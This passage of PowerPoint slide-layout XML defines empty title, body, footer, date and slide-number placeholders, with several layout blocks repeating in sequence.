            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{4E609868-9CBD-4FE9-8E1A-A80C2B6F5C54}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="229922539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935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1296940" y="2291605"/>
            <a:ext cx="9598121" cy="378709"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2382" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{FF9E85CA-9BEC-4763-8EC7-AA764B7A2E19}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{CE586DEB-CA92-4A4B-863B-E5DC36A66221}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="82929605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935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1577340"/>
            <a:ext cx="5303520" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6278880" y="1577340"/>
            <a:ext cx="5303520" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{3B7A0884-1386-44C3-B885-F404CDA667B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{DAB0FE80-7F56-48F8-89DC-48B2D19D1FE1}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="83903858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a:xfrm>
            <a:off x="935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{49233F02-E08D-4D3B-94C3-78986757D58A}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{D4900902-AA24-4DCE-B47B-DB309BA1BFC0}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="308419154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4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{4DAA92B5-25E1-49A3-B610-1795CB4B8A03}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{CC85A84F-5756-48F4-BC9A-BA7265FCFD00}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="315326137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276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="3840480"/>
            <a:ext cx="8534400" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{3571B8D1-1194-4C75-8E0F-97E3F6CC0214}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{4E609868-9CBD-4FE9-8E1A-A80C2B6F5C54}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="367389643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935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1296940" y="2291605"/>
            <a:ext cx="9598121" cy="378709"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2382" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{FF9E85CA-9BEC-4763-8EC7-AA764B7A2E19}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{CE586DEB-CA92-4A4B-863B-E5DC36A66221}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="127880248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935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1577340"/>
            <a:ext cx="5303520" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6278880" y="1577340"/>
            <a:ext cx="5303520" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{3B7A0884-1386-44C3-B885-F404CDA667B2}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
